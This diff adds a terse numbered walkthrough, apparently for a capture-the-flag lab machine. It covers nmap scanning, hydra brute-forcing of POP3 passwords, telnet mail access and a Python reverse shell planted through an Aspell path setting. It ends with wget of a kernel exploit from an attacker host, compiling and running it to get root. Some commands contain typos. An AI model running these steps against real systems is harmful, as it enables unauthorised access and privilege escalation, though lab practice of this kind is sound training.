@@ -1,0 +1,21 @@
+1 - nmap -A 10.10.234.13
+2 - view-source:http://10.10.234.13/terminal.js (Html Entity)
+3 - http://10.10.234.13/sev-home/
+4 - hydra -l natalya,boris -P /usr/share/wordlists/fasttrack.txt pop3://10.10.234.13:55007
+5 - telnet 10.10.234.13 55007
+6 - echo "10.10.234.13 severnaya-station.com" | tee -a /etc/hosts
+7 - hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.10.234.13:55007
+8 - telnet 10.10.234.13 55007
+9 - http://severnaya-station.com
+10 - wget http://10.10.234.13/dir007key/for-007.jpg
+11 - echo "hash" | base64 -d
+12 - Settings -> Aspell -> Path to Aspell -> python reverse shell
+13 - Navigation -> My Profile -> Blog -> Add a new entry -> Click Toggle Spell Checker
+14 - uname -a
+15 - searchsploit "linux 3.13"
+16 - searchpsploit -m 37292
+17 - wget http://10.8.94.51:8000/37292.c 
+18 - cc 37292 -o exploit
+19 - chmod +x exploit
+20 - ./exploit
+21 - cat /root/flag.txt
